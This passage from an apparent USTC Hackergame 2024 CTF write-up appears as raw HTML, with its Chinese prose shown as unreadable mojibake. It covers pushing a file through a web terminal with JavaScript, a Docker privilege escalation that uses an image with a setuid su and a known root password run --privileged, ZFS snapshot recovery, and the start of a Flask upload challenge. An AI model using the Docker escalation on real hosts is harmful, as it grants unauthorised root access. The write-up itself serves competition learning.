</span></span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>totalChunks</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>ceil</span><span class=p>(</span><span class=nx>text</span><span class=p>.</span><span class=nx>length</span> <span class=o>/</span> <span class=nx>chunkSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`æ€»å…±éœ€è¦å‘é€ </span><span class=si>${</span><span class=nx>totalChunks</span><span class=si>}</span><span class=sb> å—æ•°æ®ï¼Œæ¯å— </span><span class=si>${</span><span class=nx>chunkSize</span><span class=si>}</span><span class=sb> å­—ç¬¦`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// åˆ›å»ºè¿›åº¦æ˜¾ç¤ºå…ƒç´ 
</span></span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>progressDiv</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s1>&#39;div&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>progressDiv</span><span class=p>.</span><span class=nx>style</span><span class=p>.</span><span class=nx>cssText</span> <span class=o>=</span> <span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>        position: fixed;
</span></span></span><span class=line><span class=cl><span class=sb>        top: 10px;
</span></span></span><span class=line><span class=cl><span class=sb>        right: 10px;
</span></span></span><span class=line><span class=cl><span class=sb>        background: rgba(0, 0, 0, 0.8);
</span></span></span><span class=line><span class=cl><span class=sb>        color: white;
</span></span></span><span class=line><span class=cl><span class=sb>        padding: 10px;
</span></span></span><span class=line><span class=cl><span class=sb>        border-radius: 5px;
</span></span></span><span class=line><span class=cl><span class=sb>        font-family: monospace;
</span></span></span><span class=line><span class=cl><span class=sb>        z-index: 9999;
</span></span></span><span class=line><span class=cl><span class=sb>    `</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>progressDiv</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// åˆ†å—å¤„ç†
</span></span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=kd>let</span> <span class=nx>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>i</span> <span class=o>&lt;</span> <span class=nx>text</span><span class=p>.</span><span class=nx>length</span><span class=p>;</span> <span class=nx>i</span> <span class=o>+=</span> <span class=nx>chunkSize</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>chunk</span> <span class=o>=</span> <span class=nx>text</span><span class=p>.</span><span class=nx>slice</span><span class=p>(</span><span class=nx>i</span><span class=p>,</span> <span class=nx>i</span> <span class=o>+</span> <span class=nx>chunkSize</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>currentChunk</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>floor</span><span class=p>(</span><span class=nx>i</span> <span class=o>/</span> <span class=nx>chunkSize</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1>// æ›´æ–°è¿›åº¦æ˜¾ç¤º
</span></span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>progress</span> <span class=o>=</span> <span class=p>((</span><span class=nx>i</span> <span class=o>+</span> <span class=nx>chunk</span><span class=p>.</span><span class=nx>length</span><span class=p>)</span> <span class=o>/</span> <span class=nx>text</span><span class=p>.</span><span class=nx>length</span> <span class=o>*</span> <span class=mi>100</span><span class=p>).</span><span class=nx>toFixed</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>progressDiv</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>            è¿›åº¦: </span><span class=si>${</span><span class=nx>progress</span><span class=si>}</span><span class=sb>%&lt;br&gt;
</span></span></span><span class=line><span class=cl><span class=sb>            å½“å‰å—: </span><span class=si>${</span><span class=nx>currentChunk</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>totalChunks</span><span class=si>}</span><span class=sb>&lt;br&gt;
</span></span></span><span class=line><span class=cl><span class=sb>            å·²ä¼ è¾“: </span><span class=si>${</span><span class=nx>i</span> <span class=o>+</span> <span class=nx>chunk</span><span class=p>.</span><span class=nx>length</span><span class=si>}</span><span class=sb> / </span><span class=si>${</span><span class=nx>text</span><span class=p>.</span><span class=nx>length</span><span class=si>}</span><span class=sb> å­—ç¬¦`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1>// æ„é€ echoå‘½ä»¤
</span></span></span><span class=line><span class=cl>        <span class=c1>// ä½¿ç”¨-nå‚æ•°é¿å…æ¢è¡Œç¬¦ï¼Œä½¿ç”¨å•å¼•å·é¿å…ç‰¹æ®Šå­—ç¬¦é—®é¢˜
</span></span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>escapedChunk</span> <span class=o>=</span> <span class=nx>chunk</span><span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/&#39;/g</span><span class=p>,</span> <span class=s2>&#34;&#39;\\&#39;&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>command</span> <span class=o>=</span> <span class=sb>`echo -n &#39;</span><span class=si>${</span><span class=nx>escapedChunk</span><span class=si>}</span><span class=sb>&#39; &gt;&gt; 1.txt\n`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1>// å‘é€å‘½ä»¤
</span></span></span><span class=line><span class=cl>        <span class=nx>input</span><span class=p>.</span><span class=nx>focus</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nx>input</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>command</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>input</span><span class=p>.</span><span class=nx>dispatchEvent</span><span class=p>(</span><span class=k>new</span> <span class=nx>Event</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>bubbles</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=nx>cancelable</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>}));</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1>// æ¸…ç©ºè¾“å…¥æ¡†
</span></span></span><span class=line><span class=cl>        <span class=kr>await</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>input</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nx>resolve</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span> <span class=mi>100</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1>// å¦‚æœä¸æ˜¯æœ€åä¸€å—ï¼Œåˆ™æš‚åœ
</span></span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>i</span> <span class=o>+</span> <span class=nx>chunkSize</span> <span class=o>&lt;</span> <span class=nx>text</span><span class=p>.</span><span class=nx>length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// æ˜¾ç¤ºå€’è®¡æ—¶
</span></span></span><span class=line><span class=cl>            <span class=kr>const</span> <span class=nx>startTime</span> <span class=o>=</span> <span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=kr>const</span> <span class=nx>countDown</span> <span class=o>=</span> <span class=nx>setInterval</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=kr>const</span> <span class=nx>remainingTime</span> <span class=o>=</span> <span class=nb>Math</span><span class=p>.</span><span class=nx>ceil</span><span class=p>((</span><span class=nx>pauseDuration</span> <span class=o>-</span> <span class=p>(</span><span class=nb>Date</span><span class=p>.</span><span class=nx>now</span><span class=p>()</span> <span class=o>-</span> <span class=nx>startTime</span><span class=p>))</span> <span class=o>/</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>remainingTime</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>progressDiv</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>                        è¿›åº¦: </span><span class=si>${</span><span class=nx>progress</span><span class=si>}</span><span class=sb>%&lt;br&gt;
</span></span></span><span class=line><span class=cl><span class=sb>                        å½“å‰å—: </span><span class=si>${</span><span class=nx>currentChunk</span><span class=si>}</span><span class=sb>/</span><span class=si>${</span><span class=nx>totalChunks</span><span class=si>}</span><span class=sb>&lt;br&gt;
</span></span></span><span class=line><span class=cl><span class=sb>                        å·²ä¼ è¾“: </span><span class=si>${</span><span class=nx>i</span> <span class=o>+</span> <span class=nx>chunk</span><span class=p>.</span><span class=nx>length</span><span class=si>}</span><span class=sb> / </span><span class=si>${</span><span class=nx>text</span><span class=p>.</span><span class=nx>length</span><span class=si>}</span><span class=sb> å­—ç¬¦&lt;br&gt;
</span></span></span><span class=line><span class=cl><span class=sb>                        ç­‰å¾…ä¸‹ä¸€å—: </span><span class=si>${</span><span class=nx>remainingTime</span><span class=si>}</span><span class=sb>ç§’`</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=kr>await</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>clearInterval</span><span class=p>(</span><span class=nx>countDown</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nx>resolve</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=p>},</span> <span class=nx>pauseDuration</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// å®Œæˆåæ˜¾ç¤ºéªŒè¯å‘½ä»¤
</span></span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>verifyCommand</span> <span class=o>=</span> <span class=s2>&#34;wc -c 1.txt\n&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>input</span><span class=p>.</span><span class=nx>focus</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=nx>input</span><span class=p>.</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>verifyCommand</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>input</span><span class=p>.</span><span class=nx>dispatchEvent</span><span class=p>(</span><span class=k>new</span> <span class=nx>Event</span><span class=p>(</span><span class=s1>&#39;input&#39;</span><span class=p>,</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>bubbles</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>cancelable</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}));</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// ä¹Ÿæ˜¾ç¤ºåŸå§‹é•¿åº¦ï¼Œæ–¹ä¾¿æ¯”å¯¹
</span></span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`åŸå§‹å­—ç¬¦ä¸²é•¿åº¦: </span><span class=si>${</span><span class=nx>text</span><span class=p>.</span><span class=nx>length</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1>// ç­‰å¾…3ç§’åç§»é™¤è¿›åº¦æ˜¾ç¤º
</span></span></span><span class=line><span class=cl>    <span class=kr>await</span> <span class=k>new</span> <span class=nb>Promise</span><span class=p>(</span><span class=nx>resolve</span> <span class=p>=&gt;</span> <span class=nx>setTimeout</span><span class=p>(</span><span class=nx>resolve</span><span class=p>,</span> <span class=mi>3000</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=nx>progressDiv</span><span class=p>.</span><span class=nx>remove</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// ä½¿ç”¨æ–¹æ³•ï¼š
</span></span></span><span class=line><span class=cl><span class=c1>// 0. é¦–å…ˆæ¸…ç©ºæˆ–åˆ›å»ºæ–‡ä»¶ï¼š
</span></span></span><span class=line><span class=cl><span class=c1>//    echo -n &gt; 1.txt
</span></span></span><span class=line><span class=cl><span class=c1>// 1. ç„¶åå¼€å§‹ä¼ è¾“ï¼š
</span></span></span><span class=line><span class=cl><span class=c1>//    appendToFile(ä½ çš„base64å­—ç¬¦ä¸²);
</span></span></span></code></pre></div><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2024/ustc-hackergame-2024-writeup/base64enc.jpg alt><figcaption></figcaption></figure></p><p>æŠŠç½‘é¡µä¼ è¾“è¿›å»ä¹‹åï¼Œè§£ç base64ï¼Œè§£å‹å‡ºç½‘é¡µä¹‹åç”¨pythonå¼€ä¸ªhttpæœåŠ¡å™¨hostç½‘é¡µå³å¯ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>base64 -d 1.txt &gt; public.tar.gz
</span></span><span class=line><span class=cl>tar -xvf public.tar.gz
</span></span><span class=line><span class=cl><span class=nb>cd</span> public
</span></span><span class=line><span class=cl>python -m http.server <span class=m>8000</span>
</span></span></code></pre></div><p>æ‰“å¼€ç½‘é¡µå¯åŠ¨äºŒç»´ç æ˜¾ç¤ºåï¼Œæ‹¿ä¸€ä¸ªæ‰‹æœºè¯»å¤§æ¦‚2-3åˆ†é’Ÿå°±å¯ä»¥æ‹¿åˆ°æ•°æ®äº†ï¼š</p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2024/ustc-hackergame-2024-writeup/sender.jpg alt><figcaption></figcaption></figure></p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2024/ustc-hackergame-2024-writeup/scanner.jpg alt><figcaption></figcaption></figure></p><h2 id=docker-for-everyone-plus>Docker for Everyone Plus<a hidden class=anchor aria-hidden=true href=#docker-for-everyone-plus>#</a></h2><h3 id=no-enough-privilege>No Enough Privilege<a hidden class=anchor aria-hidden=true href=#no-enough-privilege>#</a></h3><pre tabindex=0><code>NOPASSWD: /usr/bin/docker run --rm -u 1000\:1000 *, 
        /usr/bin/docker image load, 
        !/usr/bin/docker * -u0*, 
        !/usr/bin/docker * -u?0*,
        !/usr/bin/docker * --user?0*, 
        !/usr/bin/docker * -ur*, 
        !/usr/bin/docker * -u?r*, 
        !/usr/bin/docker * --user?r*,
</code></pre><p>åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†<a href=https://www.mendelowski.com/til/2024/07/no-new-privileges-docker>è¿™ç¯‡æ–‡ç« </a>ï¼Œä½œè€…æåˆ°äº†å¯ä»¥è®©dockeré‡Œçš„ç”¨æˆ·ç”¨suææƒåˆ°rootï¼Œå°±å¯ä»¥å¹²å’Œ<code>docker run --rm</code>ä¹‹åä¸€æ ·çš„äº‹æƒ…äº†ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åˆ¶ä½œä¸€ä¸ªç®€å•çš„imageï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl><span class=k>FROM</span><span class=w> </span><span class=s>busybox:latest</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=c># Create a new user</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=k>RUN</span> adduser -D -u <span class=m>1000</span> user <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl>    <span class=c1># Set root password</span><span class=err>
</span></span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;root:root&#34;</span> <span class=p>|</span> chpasswd <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl>    <span class=c1># Make sure su has correct permissions</span><span class=err>
</span></span></span><span class=line><span class=cl>    chmod u+s /bin/su<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=c># Switch to the new user</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=k>USER</span><span class=w> </span><span class=s>user</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=k>WORKDIR</span><span class=w> </span><span class=s>/home/user</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=k>CMD</span> <span class=p>[</span><span class=s2>&#34;/bin/sh&#34;</span><span class=p>]</span><span class=err>
</span></span></span></code></pre></div><p>ç”¨rzä¼ åˆ°é¢˜ç›®ç¯å¢ƒé‡Œè¿è¡Œå³å¯ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>dockerv:/tmp$ sudo docker run --rm -u 1000:1000 -v /flag:/flag -v /dev:/dev --pr
</span></span><span class=line><span class=cl>ivileged --pid<span class=o>=</span>host --cap-add<span class=o>=</span>SYS_ADMIN reader_busybox1 whoami
</span></span><span class=line><span class=cl>user
</span></span><span class=line><span class=cl>dockerv:/tmp$ sudo docker run --rm -u 1000:1000  -it -v /flag:/flag -v /dev:/dev
</span></span><span class=line><span class=cl> --privileged --pid<span class=o>=</span>host --cap-add<span class=o>=</span>SYS_ADMIN reader_busybox1
</span></span><span class=line><span class=cl>~ $ su root
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl>/home/user <span class=c1># cat /flag</span>
</span></span><span class=line><span class=cl>flag<span class=o>{</span>dONT_1OAD_uNTRusT3D_1ma6e_253cb5a83d_plz!<span class=o>}</span>
</span></span></code></pre></div><h2 id=zfs-æ–‡ä»¶æ¢å¤>ZFS æ–‡ä»¶æ¢å¤<a hidden class=anchor aria-hidden=true href=#zfs-æ–‡ä»¶æ¢å¤>#</a></h2><h3 id=text-file>Text File<a hidden class=anchor aria-hidden=true href=#text-file>#</a></h3><p>æŒ‚ä¸Šç›˜ä¹‹åå¯ä»¥å…ˆç”¨<code>zdb -vvv hg2024</code>çœ‹ä¸€ä¸‹ç›˜çš„logï¼Œå¯ä»¥æ³¨æ„åˆ°åˆ›å»ºzfsçš„äººæ˜¯ç”¨çš„<code>zpool create -o ashift=9 -O atime=off -O compression=gzip -O redundant_metadata=none -O xattr=off hg2024 /dev/loop0</code>åˆ›å»ºçš„zpoolï¼Œå¹¶ä¸”åœ¨åˆ æ‰æ–‡ä»¶ä¹‹å‰ç»™ç›˜æ‰“äº†ä¸€ä¸ªå¿«ç…§<code>hg2024/data@mysnap</code>ï¼ˆ<code>2024-10-23.21:37:22 ioctl snapshot</code>ï¼‰ï¼Œä¹‹åå‚è€ƒè¿™ä¸ª<a href=https://github.com/openzfs/zfs/discussions/13326#discussioncomment-2695088>issue</a>ï¼Œç”¨<code>zfs send -R hg2024/data@mysnap | zstream dump -d > zdump.txt</code>ï¼Œåœ¨zdump.txté‡Œçœ‹èƒ½æ‰¾åˆ°flag1ã€‚</p><pre tabindex=0><code>6c 75 61 69  78 6d 70 72  70 67 68 61  71 6a 66 6c   luai xmpr pgha qjfl
    checksum = 2388d63a19/37aec6ae4719/393e10dd9e0ed3/2c106546000e7e31
WRITE object = 2 type = 19 checksum type = 2 compression type = 0 flags = 0 offset = 4096 logical_size = 4096 compressed_size = 0 payload_size = 4096 props = 0 salt = 0000000000000000 iv = 000000000000000000000000 mac = 00000000000000000000000000000000
61 67 7b 70  31 41 49 6e  4e 4e 6d 6d  6e 6e 6d 6d   ag{p 1AIn NNmm nnmm
6e 74 45 78  78 74 5f 35  30 65 61 73  79 7e 72 31   ntEx xt_5 0eas y~r1
67 68 74 3f  7e 7d 0a 00  00 00 00 00  00 00 00 00   ght? ~}.. .... ....
</code></pre><p><code>flag{p1AInNNmmnnmmntExxt_50easy~r1ght?~}</code></p><h3 id=shell-script>Shell Script<a hidden class=anchor aria-hidden=true href=#shell-script>#</a></h3><p>ç”¨<code>dd if=/dev/loop0 bs=1M | strings -n 8</code>æå–æ•´ä¸ªç›˜çš„å¯è¯»æ•°æ®ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªè„šæœ¬ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/sh
</span></span></span><span class=line><span class=cl><span class=nv>flag_key</span><span class=o>=</span><span class=s2>&#34;hg2024_</span><span class=k>$(</span>stat -c %X.%Y flag1.txt<span class=k>)</span><span class=s2>_</span><span class=k>$(</span>stat -c %X.%Y <span class=s2>&#34;</span><span class=nv>$0</span><span class=s2>&#34;</span><span class=k>)</span><span class=s2>_zfs&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;46c518b175651d440771836987a4e7404f84b20a43cc18993ffba7a37106f508  -&#34;</span> &gt; /tmp/sha256sum.txt
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s2>&#34;%s&#34;</span> <span class=s2>&#34;</span><span class=nv>$flag_key</span><span class=s2>&#34;</span> <span class=p>|</span> sha256sum --check /tmp/sha256sum.txt <span class=o>||</span> <span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=nb>printf</span> <span class=s2>&#34;flag{snapshot_%s}\n&#34;</span> <span class=s2>&#34;</span><span class=k>$(</span><span class=nb>printf</span> <span class=s2>&#34;%s&#34;</span> <span class=s2>&#34;</span><span class=nv>$flag_key</span><span class=s2>&#34;</span> <span class=p>|</span> sha1sum <span class=p>|</span> head -c 32<span class=k>)</span><span class=s2>&#34;</span>
</span></span></code></pre></div><p>é‚£ç›®æ ‡å°±æ˜¯æ‰¾flag1æ–‡ä»¶çš„atimeå’Œmtimeã€‚æˆ‘ä»¬å†å›å»ç¿»ä¸€ä¸‹<code>zdb -vvv hg2024</code>çš„ç»“æœï¼ˆå¤§æ¦‚åœ¨è¾“å‡ºçš„1470è¡Œå·¦å³ï¼‰ï¼Œå¯ä»¥çœ‹åˆ°object2å’Œobject3éƒ½æ¯”è¾ƒå¯ç–‘ï¼š</p><pre tabindex=0><code>    Object  lvl   iblk   dblk  dsize  dnsize  lsize   %full  type
         2    2   128K     4K  3.50K     512     8K  100.00  ZFS plain file
                                               176   bonus  System attributes
    dnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED 
    dnode maxblkid: 1
    uid     0
    gid     0
    atime	Thu Mar  9 23:56:50 2006
    mtime	Sun May 29 03:49:29 1977
    ctime	Wed Oct 23 21:37:22 2024
    crtime	Wed Oct 23 21:37:22 2024
    gen	10
    mode	100644
    size	4135
    parent	34
    links	0
    pflags	840800000004

    Object  lvl   iblk   dblk  dsize  dnsize  lsize   %full  type
         3    1   128K    512    512     512    512  100.00  ZFS plain file
                                               176   bonus  System attributes
    dnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED 
    dnode maxblkid: 0
    uid     0
    gid     0
    atime	Mon Nov 10 04:49:03 2036
    mtime	Sat Jan 12 01:18:00 2013
    ctime	Wed Oct 23 21:37:22 2024
    crtime	Wed Oct 23 21:37:22 2024
    gen	11
    mode	100755
    size	331
    parent	34
    links	0
    pflags	840800000104
</code></pre><p>æˆ‘ä»¬è¯•ä¸€ä¸‹ä»–ä»¬ä¸¤çš„atimeå’Œmtimeï¼Œç»“æœå‘ç°å°±æ˜¯å¯¹çš„flag2ã€‚flag_keyæ˜¯<code>hg2024_1141919810.233696969_2109876543.1357924680_zfs</code>ï¼ˆ<del>ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„atimeä¼¼ä¹æœ‰äº›æ¶è¶£å‘³</del>ï¼‰</p><p><code>flag{snapshot_6db0f20dd59a448d314cb9cabe8daea9}</code></p><h3 id=ps>P.S<a hidden class=anchor aria-hidden=true href=#ps>#</a></h3><p>ç¬”è€…ä¸€å¼€å§‹å°±åªåœ¨çœ‹zdbçš„ç»“æœï¼Œç»“æœå…ˆæŠŠç¬¬äºŒé“é¢˜åšå‡ºæ¥äº†ï¼ˆå¯èƒ½æ˜¯å› ä¸ºflag1è¢«gzipå‹ç¼©äº†ï¼Œæ˜æ–‡é‡Œçœ‹ä¸å‡ºæ¥ï¼Œä½†ç”Ÿæˆflag2çš„è„šæœ¬æ²¡æœ‰è¢«å‹ç¼©ï¼‰ï¼Œéšåå°è¯•äº†é€šè¿‡ç±»ä¼¼<code>zdb -dddddd -N hg2024 2</code>æ‰¾å‡ºæ•°æ®ä½ç½®ï¼Œç„¶åç”¨<code>zdb -R hg2024 0:20e00:a00:dv</code>ç­‰å‘½ä»¤å°è¯•å»è§£ç æ•°æ®ï¼Œä½†éƒ½ä¸€ç›´éƒ½æ— æ³•æ­£ç¡®æ¢å¤æ•°æ®ï¼ˆä¼°è®¡æ˜¯å› ä¸ºä¸æ¸…æ¥šå‹ç¼©æ–‡ä»¶å¤´çš„ä½ç½®ï¼Œæ‰€ä»¥zdb -Ræ— æ³•ç¡®è®¤å‹ç¼©çš„æ ¼å¼ï¼‰ã€‚</p><pre tabindex=0><code>zdb -ddddddddd -N hg2024 2
Dataset mos [META], ID 0, cr_txg 4, 94.5K, 56 objects, rootbp DVA[0]=&lt;0:b200:200&gt; DVA[1]=&lt;0:100b200:200&gt; DVA[2]=&lt;0:200c000:200&gt; [L0 DMU objset] fletcher4 lz4 unencrypted LE contiguous unique triple size=1000L/200P birth=33L/33P fill=56 cksum=00000008eabfc621:000003ab22c39a45:0000c4a29aa8ceb5:001bf0cf206542e2

    Object  lvl   iblk   dblk  dsize  dnsize  lsize   %full  type
         2    1    16K   128K     3K     512   128K  100.00  SPA space map (K=inherit) (Z=inherit=on)
                                               320   bonus  SPA space map header
 dnode flags: USED_BYTES 
 dnode maxblkid: 0
Indirect blocks:
               0 L0 0:1c00:400 0:1001c00:400 0:2003400:400 20000L/400P F=1 B=29/29 cksum=000000892a449fd1:00003e8c652d74ab:00106e148054423c:0339284d35914fc7

  segment [0000000000000000, 0000000000020000) size  128K
</code></pre><h4 id=å‚è€ƒ>å‚è€ƒ<a hidden class=anchor aria-hidden=true href=#å‚è€ƒ>#</a></h4><ul><li><a href=https://serverfault.com/questions/378567/zfs-is-there-a-way-to-find-out-where-the-blocks-for-a-file-are-stored#1143030>https://serverfault.com/questions/378567/zfs-is-there-a-way-to-find-out-where-the-blocks-for-a-file-are-stored#1143030</a></li><li><a href=https://openzfs.github.io/openzfs-docs/man/master/8/zdb.8.html#R>https://openzfs.github.io/openzfs-docs/man/master/8/zdb.8.html#R</a></li><li><a href=https://github.com/openzfs/zfs/discussions/13326#discussioncomment-2695088>https://github.com/openzfs/zfs/discussions/13326#discussioncomment-2695088</a></li></ul><h2 id=ç¦æ­¢å†…å·>ç¦æ­¢å†…å·<a hidden class=anchor aria-hidden=true href=#ç¦æ­¢å†…å·>#</a></h2><p>è¿™é“é¢˜çš„å…³é”®æ˜¯æœåŠ¡å™¨çš„åç«¯ä½¿ç”¨äº†<code>flask run --reload --host 0</code>å‘½ä»¤è¿è¡Œï¼Œå¹¶å¼€å¯äº†<code>--reload</code>é€‰é¡¹ï¼Œé‚£å¦‚æœæœ‰æ–‡ä»¶æ¢æ‰äº†<code>app.py</code>é‚£flaskä¼šé©¬ä¸Šåº”ç”¨æ–°çš„è„šæœ¬ã€‚è§‚å¯Ÿè¯„æµ‹çš„è„šæœ¬ï¼Œå‘ç°è„šæœ¬ç›´æ¥æŠŠæäº¤çš„æ–‡ä»¶å­˜åˆ°äº†<code>/tmp/uploads"</code>é‡Œï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>file</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>files</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span> 
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>filename</span> 
